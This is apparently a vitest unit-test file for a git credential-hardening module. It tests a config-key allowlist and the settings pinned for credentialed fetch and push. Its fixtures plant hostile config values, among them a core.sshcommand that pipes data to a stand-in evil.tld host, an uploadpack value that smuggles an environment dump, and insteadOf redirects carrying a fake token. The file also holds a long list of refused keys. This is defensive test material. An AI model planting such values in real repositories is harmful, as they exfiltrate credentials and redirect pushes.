import { describe, expect, it } from 'vitest';
import {
	credentialedCommandEntries,
	credentialedProtocol,
	displayConfigKey,
	effectiveRemoteUrls,
	foreignRepositoryConfig,
	isAllowedRepositoryConfigKey,
	parseScopedConfigList,
	privateRemoteName,
	recoveryHint,
	RESERVED_REMOTE_PREFIX,
	type ScopedConfigEntry
} from '../credentialed-command.js';

/**
 * The decisions of `credentialed-command.ts`, without git: which transport
 * a credential may use, which repository-scope keys the allowlist accepts,
 * and which command-scope entries a credentialed child is given.
 *
 * What those decisions DO against a planted config, with real git, is
 * `credentialed-command.attacks.spec.ts`.
 */

const URL_HTTPS = 'https://github.com/ever-works/ever-works.git';

const local = (key: string, value = 'x'): ScopedConfigEntry => ({ scope: 'local', key, value });
const scoped = (scope: string, key: string, value: string): ScopedConfigEntry => ({ scope, key, value });

const entriesFor = (config: ScopedConfigEntry[], env: NodeJS.ProcessEnv = {}, remoteUrl = URL_HTTPS) =>
	new Map(
		credentialedCommandEntries({
			remoteName: 'ew-credentialed-test',
			remoteUrl,
			protocol: credentialedProtocol(remoteUrl) ?? 'https',
			config,
			env
		})
	);

describe('credentialedProtocol — the one transport a credentialed child may speak', () => {
	it('is https for every URL the fleet issues a credential for', () => {
		expect(credentialedProtocol(URL_HTTPS)).toBe('https');
	});

	it('is file for a repository on disk (the hermetic suites, a local mirror)', () => {
		expect(credentialedProtocol('file:///srv/git/repo.git')).toBe('file');
	});

	it.each([
		['plain http — the header would cross the wire in clear', 'http://github.com/o/r.git'],
		['ssh', 'ssh://git@github.com/o/r.git'],
		['scp-like ssh', 'git@github.com:o/r.git'],
		['git://', 'git://github.com/o/r.git'],
		['a remote helper', 'ext::sh -c true'],
		['a bare path', '/srv/git/repo.git'],
		['nothing', '']
	])('is NONE for %s', (_label, url) => {
		expect(credentialedProtocol(url)).toBeNull();
	});
});

describe('privateRemoteName', () => {
	it('is unguessable and different every time', () => {
		const names = new Set(Array.from({ length: 50 }, () => privateRemoteName()));
		expect(names.size).toBe(50);
		for (const name of names) expect(name).toMatch(/^ew-credentialed-[0-9a-f-]{36}$/);
	});

	it('is RESERVED: no config file may hold a section for one, whatever the section says', () => {
		// `remote.<plain name>.url` is allowed (people add remotes), and a
		// private name is a plain name. Unguessable is true BEFORE the command
		// runs; while it runs the name is in its argv. So the prefix itself is
		// off limits, in any spelling Git would match.
		const name = privateRemoteName();
		expect(name.startsWith(RESERVED_REMOTE_PREFIX)).toBe(true);
		for (const variable of ['url', 'pushurl', 'fetch', 'proxy', 'proxyauthmethod', 'promisor']) {
			expect(isAllowedRepositoryConfigKey(`remote.${name}.${variable}`)).toBe(false);
		}
		expect(isAllowedRepositoryConfigKey('remote.EW-Credentialed-anything.url')).toBe(false);
		// The same variables on an ordinary remote are fine.
		expect(isAllowedRepositoryConfigKey('remote.upstream.url')).toBe(true);
	});
});

describe('parseScopedConfigList', () => {
	it('reads scope, key and value, newlines in a value included', () => {
		const stdout = [
			'system',
			'core.autocrlf\ntrue',
			'local',
			'remote.origin.url\nhttps://x/y.git',
			'local',
			'x.y\na\nb',
			''
		].join('\0');

		expect(parseScopedConfigList(stdout)).toEqual([
			{ scope: 'system', key: 'core.autocrlf', value: 'true' },
			{ scope: 'local', key: 'remote.origin.url', value: 'https://x/y.git' },
			{ scope: 'local', key: 'x.y', value: 'a\nb' }
		]);
	});

	it('reads a key with no value at all', () => {
		expect(parseScopedConfigList(['local', 'core.bare', ''].join('\0'))).toEqual([
			{ scope: 'local', key: 'core.bare', value: '' }
		]);
	});

	it('reads an empty listing as no keys', () => {
		expect(parseScopedConfigList('')).toEqual([]);
	});

	it.each([
		['text that is not a listing', 'fatal: not a git repository'],
		['a truncated record', 'local\0core.bare\ntrue'],
		['a record with no scope', '\0core.bare\ntrue\0'],
		['a key with no section', 'local\0bare\ntrue\0']
	])('answers null — never "empty" — for %s', (_label, stdout) => {
		// An unreadable config must not be mistaken for a clean one.
		expect(parseScopedConfigList(stdout)).toBeNull();
	});
});

describe('the allowlist — what the repository’s own config may carry', () => {
	it.each([
		// What `git init --bare`, `git remote add` and `git worktree add -B` write.
		'core.repositoryformatversion',
		'core.filemode',
		'core.bare',
		'core.symlinks',
		'core.ignorecase',
		'core.logallrefupdates',
		'core.precomposeunicode',
		'remote.origin.url',
		'remote.origin.fetch',
		'branch.task/x.remote',
		'branch.task/x.merge',
		'extensions.objectformat',
		'extensions.refstorage',
		// What tooling writes into a checkout.
		'core.hookspath',
		'core.fsmonitor',
		'core.autocrlf',
		'core.longpaths',
		'user.name',
		'user.email',
		'commit.gpgsign',
		'pull.rebase',
		'merge.conflictstyle',
		'lfs.repositoryformatversion',
		'lfs.https://github.com/o/r.git/info/lfs.access',
		'filter.lfs.clean',
		'filter.lfs.smudge',
		'filter.lfs.process',
		'filter.lfs.required',
		'submodule.vendor/lib.url',
		'submodule.vendor/lib.active',
		'remote.upstream.url',
		'remote.upstream.fetch',
		'remote.upstream.pushurl',
		'remote.origin.gh-resolved',
		'remote.pushdefault',
		'branch.main.gh-merge-base',
		'gc.auto',
		'maintenance.auto',
		'http.postbuffer',
		'http.lowspeedlimit',
		'fetch.prune',
		'push.autosetupremote',
		'push.default',
		'transfer.fsckobjects',
		'extensions.worktreeconfig',
		'core.sparsecheckout',
		// What Git writes itself after `fetch --filter` / `worktree add
		// --relative-paths`.
		'extensions.partialclone',
		'extensions.relativeworktrees',
		'remote.origin.promisor',
		'remote.origin.partialclonefilter',
		// Programs and switches for a terminal user: an agent that runs `git
		// config core.editor true` must not lose every later publish for it.
		'core.editor',
		'core.pager',
		'sequence.editor',
		'pager.fetch',
		'pager.log',
		'color.pager',
		'color.ui',
		'i18n.commitencoding',
		'i18n.logoutputencoding',
		'alias.co',
		'alias.fetch',
		// Drivers that run when content is checked out, merged or shown.
		'diff.external',
		'diff.pdf.textconv',
		'diff.pdf.command',
		'merge.ours.driver',
		'merge.tool',
		'mergetool.vscode.cmd',
		'mergetool.keepbackup',
		'difftool.vscode.cmd',
		'filter.custom.clean',
		// Signing: the credentialed push is pinned unsigned.
		'gpg.format',
		'gpg.program',
		'gpg.ssh.program',
		'gpg.ssh.defaultkeycommand',
		'gpg.ssh.allowedsignersfile',
		'push.gpgsign',
		// Overridden for the credentialed push.
		'push.negotiate'
	])('allows %s', (key) => {
		expect(isAllowedRepositoryConfigKey(key)).toBe(true);
	});

	it.each([
		// The review's finding, and its siblings on the same section.
		`remote.${URL_HTTPS}.url`,
		`remote.${URL_HTTPS}.uploadpack`,
		`remote.${URL_HTTPS}.receivepack`,
		`remote.${URL_HTTPS}.pushurl`,
		`remote.${URL_HTTPS}.vcs`,
		`remote.${URL_HTTPS}.proxy`,
		`remote.${URL_HTTPS}.fetch`,
		`remote.${URL_HTTPS}.mirror`,
		'remote.file:///srv/repo.git.uploadpack',
		// A plain-named remote may exist; it may not name a program or a proxy.
		'remote.origin.uploadpack',
		'remote.origin.receivepack',
		'remote.origin.vcs',
		'remote.origin.proxy',
		'remote.origin.proxyauthmethod',
		// The reserved prefix of the private remotes.
		'remote.ew-credentialed-00000000-0000-4000-8000-000000000000.url',
		'remote.ew-credentialed-00000000-0000-4000-8000-000000000000.proxy',
		// Programs a fetch or a push CAN be made to start.
		'core.sshcommand',
		'core.gitproxy',
		'core.askpass',
		'core.alternaterefscommand',
		'core.unsetenvvars',
		'core.worktree',
		'gc.recentobjectshook',
		'pack.someobjectshook',
		'uploadpack.packobjectshook',
		// The guard on the inert sections still holds outside the named
		// exceptions: a program-shaped variable nobody has classified.
		'diff.pdf.somehook',
		'merge.ours.program',
		'color.editor',
		'gc.pager',
		'interactive.difffilter',
		// Where the request goes and whom it trusts.
		'credential.helper',
		'credential.https://github.com.helper',
		'http.proxy',
		'http.sslverify',
		'http.sslcainfo',
		'http.sslcapath',
		'http.sslbackend',
		'http.curloptresolve',
		'http.followredirects',
		'http.extraheader',
		'http.cookiefile',
		`http.${URL_HTTPS}.extraheader`,
		`http.${URL_HTTPS}.postbuffer`,
		'url.https://evil.tld/.insteadof',
		'url.https://evil.tld/.pushinsteadof',
		'protocol.allow',
		'protocol.file.allow',
		'ssh.variant',
		// What pulls other config in, or other objects.
		'include.path',
		'includeif.gitdir:/x/.path',
		'fetch.bundleuri',
		'promisor.advertise',
		'extensions.somethingnew',
		// What a push could be talked into.
		'push.pushoption',
		// Anything nobody has heard of.
		'ewunknown.setting',
		'core.somethingnew',
		'nosection'
	])('refuses %s', (key) => {
		expect(isAllowedRepositoryConfigKey(key)).toBe(false);
	});

	it('judges only the repository’s own scopes — the operator’s config is the operator’s', () => {
		const config = [
			scoped('system', 'credential.helper', 'manager'),
			scoped('global', 'core.sshcommand', 'C:/Windows/System32/OpenSSH/ssh.exe'),
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('command', 'url.file:///x/.insteadof', 'https://github.com/'),
			local('core.bare', 'true'),
			local('remote.origin.url', URL_HTTPS)
		];

		expect(foreignRepositoryConfig(config)).toEqual([]);
	});

	it('treats the per-worktree file, and any scope it does not know, as the repository’s', () => {
		const config = [
			scoped('worktree', 'core.sshcommand', 'evil'),
			scoped('some-future-scope', 'http.proxy', 'http://evil'),
			local('core.bare', 'true')
		];

		expect(foreignRepositoryConfig(config)).toEqual(['core.sshcommand', 'http.proxy']);
	});

	it('names what it refuses as section.variable — never a subsection, never a value', () => {
		const config = [
			local('url.https://user:ghp_secretInASubsection@evil.tld/.insteadof', 'https://github.com/'),
			local(`remote.${URL_HTTPS}.uploadpack`, 'env > /tmp/x; git-upload-pack'),
			local(`remote.${URL_HTTPS}.url`, '/srv/decoy.git'),
			local('core.sshcommand', 'curl evil.tld -d @-'),
			local('weird section!.thing', 'x'),
			local(`remote.${URL_HTTPS}.uploadpack`, 'twice')
		];

		const names = foreignRepositoryConfig(config);

		expect(names).toEqual([
			'url.<…>.insteadof',
			'remote.<…>.uploadpack',
			'remote.<…>.url',
			'core.sshcommand',
			'<…>.thing'
		]);
		expect(names.join(' ')).not.toContain('ghp_secretInASubsection');
		expect(names.join(' ')).not.toContain('evil.tld');
		expect(names.join(' ')).not.toContain('github.com');
	});
});

describe('credentialedCommandEntries — what a credentialed child is given at exec time', () => {
	it('defines the private remote and switches off every program a fetch or a push could be made to start', () => {
		const entries = entriesFor([]);

		expect(entries.get('remote.ew-credentialed-test.url')).toBe(URL_HTTPS);
		expect(entries.get('core.fsmonitor')).toBe('false');
		expect(entries.get('core.alternateRefsCommand')).toBe('');
		expect(entries.get('maintenance.auto')).toBe('false');
		expect(entries.get('gc.auto')).toBe('0');
		expect(entries.get('push.gpgSign')).toBe('false');
		expect(entries.get('fetch.recurseSubmodules')).toBe('false');
		expect(entries.get('push.recurseSubmodules')).toBe('no');
		// A negotiating push fetches BY URL first; see the attack spec.
		expect(entries.get('push.negotiate')).toBe('false');
		// Git for Windows' own default: nothing else is unset for its children.
		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB');
	});

	it('pins the connection to its DEFAULTS when the operator configured nothing', () => {
		const entries = entriesFor([]);

		expect(entries.get(`http.${URL_HTTPS}.sslVerify`)).toBe('true');
		expect(entries.get(`http.${URL_HTTPS}.proxy`)).toBe('');
		expect(entries.get(`http.${URL_HTTPS}.followRedirects`)).toBe('initial');
		expect(entries.get(`http.${URL_HTTPS}.schannelUseSSLCAInfo`)).toBe('false');
		expect(entries.get(`http.${URL_HTTPS}.curloptResolve`)).toBe('');
		// There is no value that means "the built-in CA bundle", so these are
		// not invented.
		expect(entries.has(`http.${URL_HTTPS}.sslCAInfo`)).toBe(false);
		expect(entries.has(`http.${URL_HTTPS}.sslCAPath`)).toBe(false);
		expect(entries.has(`http.${URL_HTTPS}.sslBackend`)).toBe(false);
	});

	it('re-asserts the OPERATOR’s own posture, so a proxied or unverified machine behaves as it did', () => {
		const entries = entriesFor([
			scoped('system', 'http.sslbackend', 'schannel'),
			scoped('system', 'http.sslcainfo', 'C:/Program Files/Git/mingw64/etc/ssl/certs/ca-bundle.crt'),
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('global', 'http.sslverify', 'false'),
			scoped('global', 'core.unsetenvvars', 'PERL5LIB,FOO'),
			scoped('command', 'http.curloptresolve', 'github.com:443:10.0.0.7')
		]);

		expect(entries.get(`http.${URL_HTTPS}.proxy`)).toBe('http://proxy.corp:8080');
		expect(entries.get(`http.${URL_HTTPS}.sslVerify`)).toBe('false');
		expect(entries.get(`http.${URL_HTTPS}.sslBackend`)).toBe('schannel');
		expect(entries.get(`http.${URL_HTTPS}.sslCAInfo`)).toBe(
			'C:/Program Files/Git/mingw64/etc/ssl/certs/ca-bundle.crt'
		);
		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB,FOO');
		// The operator pinned a resolution of their own: not cleared.
		expect(entries.has(`http.${URL_HTTPS}.curloptResolve`)).toBe(false);
	});

	it('takes NOTHING from the repository’s own scopes — that is the config it is defending against', () => {
		const entries = entriesFor([
			local('http.proxy', 'http://evil:8080'),
			local('http.sslverify', 'false'),
			local('http.sslcainfo', '/tmp/planted-ca.pem'),
			local('http.curloptresolve', 'github.com:443:6.6.6.6'),
			local('core.unsetenvvars', 'GIT_ALLOW_PROTOCOL'),
			scoped('worktree', 'http.proxy', 'http://evil:8081')
		]);

		expect(entries.get(`http.${URL_HTTPS}.proxy`)).toBe('');
		expect(entries.get(`http.${URL_HTTPS}.sslVerify`)).toBe('true');
		expect(entries.has(`http.${URL_HTTPS}.sslCAInfo`)).toBe(false);
		expect(entries.get(`http.${URL_HTTPS}.curloptResolve`)).toBe('');
		expect(entries.get('core.unsetenvvars')).toBe('PERL5LIB');
	});

	it('leaves a key alone when the operator configured it PER URL', () => {
		// Which `http.<url>.*` entry applies to a URL is Git's own matching.
		// Guessing it wrong would pin the wrong proxy on somebody's machine,
		// so such a key is not touched at all.
		const entries = entriesFor([
			scoped('global', 'http.https://github.com/.proxy', 'http://gh-proxy.corp:3128'),
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('system', 'http.https://internal.corp/.sslverify', 'false')
		]);

		expect(entries.has(`http.${URL_HTTPS}.proxy`)).toBe(false);
		expect(entries.has(`http.${URL_HTTPS}.sslVerify`)).toBe(false);
		// Unrelated keys are still pinned.
		expect(entries.get(`http.${URL_HTTPS}.followRedirects`)).toBe('initial');
	});

	it.each([
		[
			'https_proxy wins over HTTPS_PROXY',
			{ https_proxy: 'http://lower:1', HTTPS_PROXY: 'http://upper:1' },
			'http://lower:1'
		],
		['HTTPS_PROXY alone', { HTTPS_PROXY: 'http://upper:1' }, 'http://upper:1'],
		['all_proxy only when no https variable is set', { all_proxy: 'socks5://all:1' }, 'socks5://all:1'],
		[
			'an https variable beats all_proxy',
			{ all_proxy: 'socks5://all:1', https_proxy: 'http://lower:1' },
			'http://lower:1'
		],
		['an https variable set to empty means no proxy', { https_proxy: '', all_proxy: 'socks5://all:1' }, ''],
		['http_proxy is not for an https URL', { http_proxy: 'http://plain:1' }, ''],
		['nothing set', {}, '']
	])('with no http.proxy of the operator’s, takes the proxy git itself would: %s', (_label, env, expected) => {
		expect(entriesFor([], env).get(`http.${URL_HTTPS}.proxy`)).toBe(expected);
	});

	it('pins the proxy on the PRIVATE REMOTE too — a remote’s proxy outranks http.<url>.proxy', () => {
		// `http.c` takes `remote.<name>.proxy` over `http.proxy` when the remote
		// has one, and the name is in the command's argv while it runs. So the
		// value the http pin carries is put on the remote itself, last in
		// config order.
		const none = entriesFor([]);
		expect(none.get('remote.ew-credentialed-test.proxy')).toBe('');
		expect(none.get('remote.ew-credentialed-test.proxyAuthMethod')).toBe('anyauth');

		const fromEnvironment = entriesFor([], { https_proxy: 'http://lower:1' });
		expect(fromEnvironment.get('remote.ew-credentialed-test.proxy')).toBe('http://lower:1');
		expect(fromEnvironment.get(`http.${URL_HTTPS}.proxy`)).toBe('http://lower:1');

		const operators = entriesFor([
			scoped('global', 'http.proxy', 'http://proxy.corp:8080'),
			scoped('global', 'http.proxyauthmethod', 'negotiate'),
			local('remote.ew-credentialed-test.proxy', 'http://evil:1'),
			local('http.proxyauthmethod', 'basic')
		]);
		expect(operators.get('remote.ew-credentialed-test.proxy')).toBe('http://proxy.corp:8080');
		expect(operators.get('remote.ew-credentialed-test.proxyAuthMethod')).toBe('negotiate');
	});

	it('does not put a proxy on the private remote when the operator’s own are per URL', () => {
		// It would REPLACE whichever of them Git's URL matching picks.
		const entries = entriesFor([
			scoped('global', 'http.https://github.com/.proxy', 'http://gh-proxy.corp:3128'),
			scoped('global', 'http.https://github.com/.proxyauthmethod', 'ntlm')
		]);

		expect(entries.has('remote.ew-credentialed-test.proxy')).toBe(false);
		expect(entries.has('remote.ew-credentialed-test.proxyAuthMethod')).toBe(false);
	});

	it('adds no connection settings for a repository on disk', () => {
		const entries = entriesFor([], {}, 'file:///srv/git/repo.git');

		expect([...entries.keys()].some((key) => key.startsWith('http.'))).toBe(false);
		expect([...entries.keys()].some((key) => key.endsWith('.proxy'))).toBe(false);
		expect(entries.get('remote.ew-credentialed-test.url')).toBe('file:///srv/git/repo.git');
		expect(entries.get('core.alternateRefsCommand')).toBe('');
	});

	it('never carries the credential — these entries know the remote, not the token', () => {
		const entries = credentialedCommandEntries({
			remoteName: 'ew-credentialed-test',
			remoteUrl: URL_HTTPS,
			protocol: 'https',
			config: [],
			env: {}
		});

		expect(JSON.stringify(entries)).not.toContain('Authorization');
	});
});

describe('displayConfigKey — how a key may be shown', () => {
	it.each([
		['core.sshcommand', 'core.sshcommand'],
		['credential.helper', 'credential.helper'],
		['url.https://user:ghp_secret@evil.tld/.insteadof', 'url.<…>.insteadof'],
		['http.https://github.com/o/r.git.extraheader', 'http.<…>.extraheader'],
		['credential.https://github.com.helper', 'credential.<…>.helper'],
		['weird section!.thing', '<…>.thing']
	])('%s → %s', (key, shown) => {
		expect(displayConfigKey(key)).toBe(shown);
	});
});

describe('recoveryHint — the way out of a refusal', () => {
	const POOL = 'C:\\fleet\\repos\\abc123.git';

	it('gives the exact unset for a key that has no subsection', () => {
		expect(recoveryHint(['core.sshcommand', 'include.path'], POOL)).toBe(
			'To clear it on this machine: ' +
				'git -C "C:/fleet/repos/abc123.git" config --unset-all core.sshcommand; ' +
				'git -C "C:/fleet/repos/abc123.git" config --unset-all include.path'
		);
	});

	it('gives the command that LISTS the full names for a key whose subsection is not shown', () => {
		// The subsection is never printed, so it cannot be in the command
		// either: the operator lists the names on the machine and unsets those.
		// For `url` (a variable a plain-named remote may carry) the listing
		// is only the sections the allowlist refuses — not `remote.origin.url`.
		expect(recoveryHint(['remote.<…>.uploadpack', 'remote.<…>.url'], '/srv/fleet/repos/abc.git')).toBe(
			'To clear it on this machine: ' +
				'git -C "/srv/fleet/repos/abc.git" config --show-origin --name-only --get-regexp ' +
				'"^remote\\..*\\.uploadpack$|^remote\\.(([^A-Za-z0-9].*)?|.*[^A-Za-z0-9._-].*|ew-credentialed-.*)\\.url$" ' +
				'(lists the full names; then git -C "/srv/fleet/repos/abc.git" config --unset-all <name> for each)'
		);
	});

	it.each([
		[
			'remote.<…>.url',
			['remote.https://evil.tld/o/r.git.url', 'remote.ew-credentialed-1.url', 'remote..url', 'remote.-x.url'],
			['remote.origin.url', 'remote.up_stream-2.url', 'remote.EW-CREDENTIALED-1.url']
		],
		['remote.<…>.fetch', ['remote.file:///x.fetch'], ['remote.origin.fetch']],
		[
			'remote.<…>.uploadpack',
			['remote.origin.uploadpack', 'remote.https://evil.tld/.uploadpack'],
			['remote.origin.url']
		],
		['url.<…>.insteadof', ['url.ssh://x/.insteadof'], ['url.insteadof']],
		['http.<…>.postbuffer', ['http.https://x/.postbuffer'], ['http.postbuffer']]
	])('lists for %s exactly the keys the allowlist refuses', (name, listed, kept) => {
		// The pattern is what an operator unsets every match of. Matched here
		// with a POSIX-extended-compatible JavaScript RegExp, as `git config
		// --get-regexp` matches it, and held to the allowlist both ways.
		const pattern = /--get-regexp "([^"]+)"/.exec(recoveryHint([name], '/p.git'))?.[1] ?? '';
		const regexp = new RegExp(pattern);
		for (const key of listed) {
			expect(regexp.test(key)).toBe(true);
			expect(isAllowedRepositoryConfigKey(key)).toBe(false);
		}
		for (const key of kept) {
			expect(regexp.test(key)).toBe(false);
		}
	});

	it('gives both when both kinds are named', () => {
		const hint = recoveryHint(['core.sshcommand', 'url.<…>.insteadof'], '/p.git');

		expect(hint).toContain('git -C "/p.git" config --unset-all core.sshcommand; ');
		expect(hint).toContain('--get-regexp "^url\\..*\\.insteadof$"');
	});

	it('falls back to listing everything for a name it cannot put in a command', () => {
		expect(recoveryHint(['<…>.thing'], '/p.git')).toBe(
			'To clear it on this machine: ' +
				'git -C "/p.git" config --show-origin --show-scope --list --name-only ' +
				'(lists the full names; then git -C "/p.git" config --unset-all <name> for each)'
		);
	});

	it('is built from the displayed names only — nothing it prints can be a subsection or a value', () => {
		const names = foreignRepositoryConfig([
			local('url.https://user:ghp_secretInASubsection@evil.tld/.insteadof', 'https://github.com/'),
			local('core.sshcommand', 'curl evil.tld -d @-')
		]);

		const hint = recoveryHint(names, '/p.git');

		expect(hint).not.toContain('ghp_secretInASubsection');
		expect(hint).not.toContain('evil.tld');
		expect(hint).not.toContain('curl');
	});
});

describe('effectiveRemoteUrls — the URL git will really use', () => {
	const GITHUB = 'https://github.com/ever-works/ever-works.git';

	it('is the URL itself when nothing rewrites it', () => {
		expect(effectiveRemoteUrls([scoped('global', 'user.name', 'x')], GITHUB)).toEqual({
			fetch: GITHUB,
			push: GITHUB,
			fetchRule: null,
			pushRule: null
		});
	});

	it('applies insteadOf to the fetch AND the push, and names the key and scope — not the value', () => {
		const urls = effectiveRemoteUrls(
			[scoped('global', 'url.ssh://git@github.com/.insteadof', 'https://github.com/')],
			GITHUB
		);

		expect(urls.fetch).toBe('ssh://git@github.com/ever-works/ever-works.git');
		expect(urls.push).toBe('ssh://git@github.com/ever-works/ever-works.git');
		expect(urls.fetchRule).toEqual({ key: 'url.<…>.insteadof', scope: 'global' });
		expect(urls.pushRule).toEqual({ key: 'url.<…>.insteadof', scope: 'global' });
	});

	it('applies pushInsteadOf to the push only', () => {
		const urls = effectiveRemoteUrls(
			[scoped('system', 'url.ssh://git@github.com/.pushinsteadof', 'https://github.com/')],
			GITHUB
		);

		expect(urls.fetch).toBe(GITHUB);
		expect(urls.fetchRule).toBeNull();
		expect(urls.push).toBe('ssh://git@github.com/ever-works/ever-works.git');
		expect(urls.pushRule).toEqual({ key: 'url.<…>.pushinsteadof', scope: 'system' });
	});

	it('lets pushInsteadOf rewrite the ORIGINAL url, not the one insteadOf produced', () => {
		const urls = effectiveRemoteUrls(
			[
				scoped('global', 'url.ssh://git@github.com/.insteadof', 'https://github.com/'),
				scoped('global', 'url.ssh://other/.pushinsteadof', 'https://github.com/ever-works/')
			],
			GITHUB
		);

		expect(urls.fetch).toBe('ssh://git@github.com/ever-works/ever-works.git');
		expect(urls.push).toBe('ssh://other/ever-works.git');
	});

	it('takes the LONGEST matching prefix, whatever the order', () => {
		const urls = effectiveRemoteUrls(
			[
				scoped('system', 'url.ssh://short/.insteadof', 'https://github.com/'),
				scoped('global', 'url.ssh://long/.insteadof', 'https://github.com/ever-works/'),
				scoped('global', 'url.ssh://unrelated/.insteadof', 'https://gitlab.com/')
			],
			GITHUB
		);

		expect(urls.fetch).toBe('ssh://long/ever-works.git');
		expect(urls.fetchRule?.scope).toBe('global');
	});

	it('breaks a tie the way git does: base by base, in the order the bases first appear', () => {
		const urls = effectiveRemoteUrls(
			[
				scoped('global', 'url.ssh://first/.insteadof', 'https://example.invalid/'),
				scoped('global', 'url.ssh://second/.insteadof', 'https://github.com/'),
				scoped('global', 'url.ssh://first/.insteadof', 'https://github.com/')
			],
			GITHUB
		);

		expect(urls.fetch).toBe('ssh://first/ever-works/ever-works.git');
	});

	it('is case-sensitive about the prefix, as git is', () => {
		const urls = effectiveRemoteUrls(
			[scoped('global', 'url.ssh://git@github.com/.insteadof', 'https://GitHub.com/')],
			GITHUB
		);

		expect(urls.fetch).toBe(GITHUB);
	});

	it('reads every scope — a rewrite is a rewrite wherever it is written', () => {
		const urls = effectiveRemoteUrls(
			[scoped('command', 'url.file:///local/.insteadof', 'https://github.com/')],
			GITHUB
		);

		expect(urls.fetch).toBe('file:///local/ever-works/ever-works.git');
		expect(urls.fetchRule?.scope).toBe('command');
	});
});
